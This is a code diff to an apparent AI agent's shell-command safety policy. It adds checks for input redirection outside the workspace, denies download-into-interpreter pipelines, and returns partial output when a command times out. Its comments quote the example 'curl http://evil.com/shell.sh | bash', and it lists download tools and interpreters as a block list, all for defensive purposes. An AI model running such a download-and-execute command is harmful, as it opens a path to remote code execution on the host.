@@ -68,6 +68,10 @@ _HOME_VAR_RE = re.compile(
 # "> file". ``&>`` and ``>&`` are caught because their ``>`` is matched here.
 _REDIRECT_RE = re.compile(r"(?:>>|>\|?)\s*([^\s;|&<>]+)")
 
+# Input redirection: "< file", "<> file" (read-write), "<&N" (fd dup).
+# Negative lookahead (?!\\() excludes process substitution <(...).
+_INPUT_REDIRECT_RE = re.compile(r"<[&>]?\s*(?!\()\s*([^\s;|&<>]+)")
+
 # How deep command substitutions are followed: a substitution may contain
 # another substitution.
 _MAX_SUBSTITUTION_DEPTH = 3
@@ -81,6 +85,9 @@ _ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
 
 # Targets that discard output rather than write a real file.
 _SPECIAL_WRITE_TARGETS = frozenset({"/dev/null", "/dev/stdout", "/dev/stderr"})
+
+# Harmless read targets for input redirection.
+_SPECIAL_READ_TARGETS = frozenset({"/dev/null", "/dev/zero"})
 
 
 def _normalize_command(command: str) -> str:
@@ -371,7 +378,8 @@ def _target_inside_workspace(target: str, workspace: Path) -> bool:
 
 
 def _redirects_outside_workspace(segment: str, workspace: Path) -> bool:
-    """Report whether a segment redirects output outside of the workspace."""
+    """Report whether a segment redirects input or output outside of the workspace."""
+    # Check output redirections (>, >>, >|)
     for match in _REDIRECT_RE.finditer(segment):
         target = match.group(1).strip().strip("\"'")
         if not target:
@@ -382,6 +390,18 @@ def _redirects_outside_workspace(segment: str, workspace: Path) -> bool:
             continue
         # A target that still contains a shell expansion cannot be resolved
         # statically: the shell expands it before opening the file.
+        if "$" in target or "`" in target:
+            return True
+        if not _target_inside_workspace(target, workspace):
+            return True
+    # Check input redirections (<, <>, <&)
+    for match in _INPUT_REDIRECT_RE.finditer(segment):
+        target = match.group(1).strip().strip("\"'")
+        if not target:
+            continue
+        # /dev/null and /dev/zero are harmless read targets.
+        if target in _SPECIAL_READ_TARGETS:
+            continue
         if "$" in target or "`" in target:
             return True
         if not _target_inside_workspace(target, workspace):
@@ -514,6 +534,67 @@ def _is_dangerous_segment(segment: str, workspace: Path) -> bool:
     return bool(_writes_outside_workspace(segment, workspace))
 
 
+# Programs that download content from the network. When piped directly into
+# a shell or interpreter this is the classic download-and-execute pattern
+# (e.g. ``curl http://evil.com/shell.sh | bash``), which is a remote-code
+# execution vector.
+_DOWNLOAD_PROGRAMS = frozenset({"curl", "wget", "fetch"})
+
+# Programs that act as a shell or interpreter for a script read from stdin.
+# When one of these is the consumer of a pipeline whose producer is a
+# download program, the combination is denied.
+_INTERPRETER_PROGRAMS = frozenset(
+    {
+        "sh",
+        "bash",
+        "dash",
+        "zsh",
+        "ksh",
+        "csh",
+        "tcsh",
+        "fish",
+        "ash",
+        "python",
+        "python2",
+        "python3",
+        "perl",
+        "ruby",
+        "node",
+        "nodejs",
+        "php",
+        "lua",
+    }
+)
+
+
+def _is_download_pipe_to_interpreter(text: str) -> bool:
+    """Report whether a pipeline pipes a download program into a shell/interpreter.
+
+    This catches the download-and-execute pattern (e.g.
+    ``curl http://evil.com/shell.sh | bash``) without denying ordinary use of
+    ``curl``/``wget`` (downloading a file) or ``python`` (running a script).
+    Each segment of the pipeline is inspected; if a segment whose effective
+    program is a download tool is directly piped into a segment whose
+    effective program is a shell or interpreter, the combination is denied.
+    """
+    segments = _split_command_segments(text)
+    for i, segment in enumerate(segments):
+        parsed = _program_and_args(segment)
+        if parsed is None:
+            continue
+        name, _args = parsed
+        if name not in _DOWNLOAD_PROGRAMS:
+            continue
+        # Check the next segment: is it a shell or interpreter?
+        if i + 1 < len(segments):
+            next_parsed = _program_and_args(segments[i + 1])
+            if next_parsed is not None:
+                next_name, _ = next_parsed
+                if next_name in _INTERPRETER_PROGRAMS:
+                    return True
+    return False
+
+
 def _text_is_denied(text: str, workspace: Path, depth: int) -> bool:
     """Check a command - or the text of a command substitution - against the policy."""
     normalized = _normalize_command(text)
@@ -521,6 +602,9 @@ def _text_is_denied(text: str, workspace: Path, depth: int) -> bool:
     # denied pattern cannot hide in an unusual position (inside quotes, in
     # the middle of a pipeline, ...).
     if any(denied.lower() in normalized for denied in DENIED_COMMANDS):
+        return True
+    # DENY download-and-execute pipelines (curl | bash, wget | python, etc.).
+    if _is_download_pipe_to_interpreter(text):
         return True
     # Every segment of the text is checked on its own.
     if any(_is_dangerous_segment(segment, workspace) for segment in _split_command_segments(text)):
@@ -784,13 +868,28 @@ class WorkerAgent:
                 )
         except (OSError, ValueError, RuntimeError) as exc:
             return f"error: {exc}"
-        try:
-            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
-        except asyncio.TimeoutError:
+        communicate_task = asyncio.create_task(proc.communicate())
+        done, _pending = await asyncio.wait({communicate_task}, timeout=timeout)
+        timed_out = communicate_task not in done
+        if timed_out:
+            # The communicate task is still running in the background and keeps
+            # consuming output. Kill the process tree so its pipes close, then
+            # let communicate() finish and return any partial output that was
+            # written before the kill.
             await self._kill_process_tree(proc, new_session)
-            return "command timed out"
+            try:
+                stdout, stderr = await asyncio.wait_for(communicate_task, timeout=5.0)
+            except asyncio.TimeoutError:
+                communicate_task.cancel()
+                stdout, stderr = b"", b""
+        else:
+            stdout, stderr = communicate_task.result()
         out = stdout.decode("utf-8", errors="replace")
         err = stderr.decode("utf-8", errors="replace")
+        if timed_out:
+            if out or err:
+                return f"command timed out\n[partial output]\n{out}{err}"
+            return "command timed out"
         combined = out + "\n[stderr]\n" + err if err.strip() else out
         cap = 20000
         if len(combined) > cap:
@@ -815,7 +914,8 @@ class WorkerAgent:
                 else:
                     with contextlib.suppress(asyncio.TimeoutError, ProcessLookupError):
                         await asyncio.wait_for(proc.wait(), timeout=5.0)
-                    return
         # Fallback: no process group available (or killing it failed).
         with contextlib.suppress(ProcessLookupError, OSError):
             proc.kill()
+        with contextlib.suppress(asyncio.TimeoutError, ProcessLookupError):
+            await asyncio.wait_for(proc.wait(), timeout=5.0)
